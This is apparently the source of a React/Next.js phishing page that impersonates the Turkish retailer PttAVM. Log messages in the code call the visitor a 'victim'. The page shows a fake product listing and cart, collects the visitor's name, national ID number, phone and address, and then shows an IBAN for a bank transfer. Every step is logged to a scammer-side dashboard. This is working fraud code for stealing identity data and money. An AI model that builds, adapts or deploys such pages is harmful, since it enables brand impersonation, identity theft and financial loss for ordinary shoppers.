'use client';

import { useState, useEffect } from 'react';
import { useParams } from 'next/navigation';

export default function PttAVMTemplate() {
    const params = useParams();
    const slug = params.slug as string;
    const [ilan, setIlan] = useState<any>(null);
    const [step, setStep] = useState(1);
    const [loading, setLoading] = useState(true);
    const [error, setError] = useState(false);
    
    // Form states
    const [address, setAddress] = useState({ ad: '', soyad: '', il: '', ilce: '', mahalle: '', tel: '', tc: '', adres: '' });

    useEffect(() => {
        fetchIlan();
    }, [slug]);

    const fetchIlan = async () => {
        try {
            const res = await fetch(`/api/ilan/${slug}`);
            if (res.ok) {
                const data = await res.json();
                setIlan(data);
                logAksiyon('İlana Giriş Yaptı', 'Kurban vitrini inceliyor (PttAVM).');
            } else {
                setError(true);
            }
        } catch (e) {
            setError(true);
        } finally {
            setLoading(false);
        }
    };

    const logAksiyon = async (aksiyon: string, detay: string = "") => {
        if (!ilan) return;
        try {
            await fetch('/api/log-ekle', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    saticiId: ilan.olusturanMusteri,
                    ilanBasligi: ilan.urunAdi,
                    aksiyon,
                    detay,
                    ip: 'Pending',
                    cihaz: navigator.userAgent.includes('iPhone') ? 'Apple iOS' : 'Android/PC',
                    tarih: new Date().toLocaleDateString('tr-TR'),
                    saat: new Date().toLocaleTimeString('tr-TR', { hour: '2-digit', minute: '2-digit' })
                })
            });
        } catch (e) {}
    };

    if (loading) return <div className="loader">Yükleniyor...</div>;
    if (error) return <div className="error-screen">İlan Yayında Değil</div>;

    return (
        <div className="app-container">
            <header className="header">
                <div className="logo">Ptt<span>AVM</span></div>
                <div className="cart-icon">🛒<div className="badge">1</div></div>
            </header>

            {step === 1 && (
                <div className="step-1 animate-fade">
                    <div className="gallery">
                        <img src={ilan.anaResim} alt="product" />
                    </div>
                    <div className="info-card">
                        <h1 className="title">{ilan.urunAdi}</h1>
                        <div className="price">{ilan.fiyat} TL</div>
                        <div className="badges">
                            <span className="badge-kargo">Ücretsiz Kargo</span>
                            <span className="badge-indir">İndirimli Ürün</span>
                        </div>
                        <p className="description">{ilan.urunAciklamasi}</p>
                    </div>
                    <div className="sticky-footer">
                        <button className="btn-buy" onClick={() => { setStep(2); logAksiyon('Hemen Al Butonuna Bastı', 'Sepet ekranına geçti.'); }}>Hemen Al</button>
                    </div>
                </div>
            )}

            {step === 2 && (
                <div className="step-2 animate-fade">
                    <div className="cart-header">Sepetim (1 Ürün)</div>
                    <div className="cart-item">
                        <img src={ilan.anaResim} alt="product" />
                        <div className="cart-item-info">
                            <div className="title">{ilan.urunAdi}</div>
                            <div className="price">{ilan.fiyat} TL</div>
                        </div>
                    </div>
                    <div className="summary">
                        <div className="row"><span>Ara Toplam:</span><span>{ilan.fiyat} TL</span></div>
                        <div className="row"><span>Kargo:</span><span>Ücretsiz</span></div>
                        <div className="row total"><span>Toplam:</span><span>{ilan.fiyat} TL</span></div>
                    </div>
                    <div className="sticky-footer">
                        <button className="btn-next" onClick={() => { setStep(3); logAksiyon('Sepeti Onayladı', 'Adres bilgilerine geçti.'); }}>Ürünleri Kontrol Ettim</button>
                    </div>
                </div>
            )}

            {step === 3 && (
                <div className="step-3 animate-fade">
                    <div className="form-title">Teslimat Bilgileri</div>
                    <div className="form-card">
                        <input type="text" placeholder="İsim *" onChange={e => setAddress({...address, ad: e.target.value})} />
                        <input type="text" placeholder="Soyisim *" onChange={e => setAddress({...address, soyad: e.target.value})} />
                        <input type="text" placeholder="TC Kimlik No *" onChange={e => setAddress({...address, tc: e.target.value})} />
                        <input type="tel" placeholder="Telefon Numarası *" onChange={e => setAddress({...address, tel: e.target.value})} />
                        <textarea placeholder="Adres *" onChange={e => setAddress({...address, adres: e.target.value})}></textarea>
                    </div>
                    <div className="sticky-footer">
                        <button className="btn-next" onClick={() => { setStep(4); logAksiyon('Adresi Kaydetti', `Adres: ${address.adres}`); }}>Ödemeye Geç</button>
                    </div>
                </div>
            )}

            {step === 4 && (
                <div className="step-4 animate-fade">
                    <div className="form-title">Ödeme (Havale/EFT)</div>
                    <div className="iban-card">
                        <div className="row"><span>ALICI IBAN</span><div className="val">{ilan.iban || 'TR00...'}</div></div>
                        <div className="row"><span>ALICI AD SOYAD</span><div className="val">{ilan.saticiAdi || 'İsimsiz'}</div></div>
                    </div>
                    <div className="sticky-footer">
                        <button className="btn-next" onClick={() => { alert('Ödemeniz kontrol ediliyor.'); logAksiyon('Siparişi Tamamladı', 'PttAVM üzerinden ödeme bildirimi yaptı.'); }}>Siparişi Tamamla</button>
                    </div>
                </div>
            )}

            <style jsx>{`
                .app-container { max-width: 480px; margin: 0 auto; background: #fff; min-height: 100vh; font-family: -apple-system, sans-serif; }
                .header { padding: 15px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; }
                .logo { font-size: 20px; font-weight: 800; color: #0059a3; }
                .logo span { color: #fcd55c; }
                .cart-icon { position: relative; font-size: 20px; }
                .badge { position: absolute; top: -5px; right: -5px; background: #e02020; color: #fff; font-size: 10px; padding: 2px 5px; border-radius: 50%; }

                .gallery img { width: 100%; height: 320px; object-fit: contain; background: #fff; }
                .info-card { padding: 15px; border-bottom: 5px solid #f5f5f5; margin-bottom: 80px; }
                .title { font-size: 18px; font-weight: 400; margin-bottom: 10px; }
                .price { font-size: 28px; font-weight: bold; color: #00a651; margin-bottom: 10px; }
                .badges { display: flex; gap: 10px; margin-bottom: 15px; }
                .badge-kargo { background: #e0f2f5; color: #008c99; font-size: 11px; padding: 5px 10px; border-radius: 20px; font-weight: bold; }
                .badge-indir { background: #e6f4ea; color: #28a745; font-size: 11px; padding: 5px 10px; border-radius: 20px; font-weight: bold; }
                .description { font-size: 13px; color: #666; line-height: 1.5; }

                .sticky-footer { position: fixed; bottom: 0; width: 100%; max-width: 480px; background: #fff; padding: 12px 15px; border-top: 1px solid #eee; }
                .btn-buy { width: 100%; background: #fcd55c; color: #333; border: none; padding: 15px; border-radius: 6px; font-weight: bold; font-size: 16px; }
                .btn-next { width: 100%; background: #46b3cf; color: #fff; border: none; padding: 15px; border-radius: 6px; font-weight: bold; font-size: 16px; }

                .cart-header { padding: 15px; background: #fafafa; font-weight: bold; font-size: 18px; }
                .cart-item { display: flex; gap: 15px; padding: 15px; border-bottom: 1px solid #eee; }
                .cart-item img { width: 80px; height: 80px; border-radius: 5px; border: 1px solid #eee; }
                .summary { padding: 15px; }
                .row { display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 10px; }
                .total { border-top: 1px solid #eee; padding-top: 10px; font-weight: bold; font-size: 16px; color: #00a651; }

                .form-title { font-size: 16px; font-weight: bold; color: #46b3cf; padding: 15px; background: #fafafa; }
                .form-card { padding: 15px; }
                .form-card input, .form-card textarea { width: 100%; padding: 15px; border: none; border-bottom: 1px solid #eee; outline: none; }

                .iban-card { padding: 20px; background: #f9f9f9; border: 1px solid #eee; margin: 15px; border-radius: 8px; }
                .iban-card .row { flex-direction: column; gap: 5px; margin-bottom: 15px; }
                .iban-card .row span { font-size: 11px; color: #888; }
                .iban-card .row .val { font-weight: bold; font-size: 15px; }

                .animate-fade { animation: fadeIn 0.3s ease-in-out; }
                @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
                .loader { display: flex; align-items: center; justify-content: center; height: 100vh; font-weight: bold; color: #0059a3; }
                .error-screen { display: flex; align-items: center; justify-content: center; height: 100vh; font-weight: bold; color: #ef4444; }
            `}</style>
        </div>
    );
}
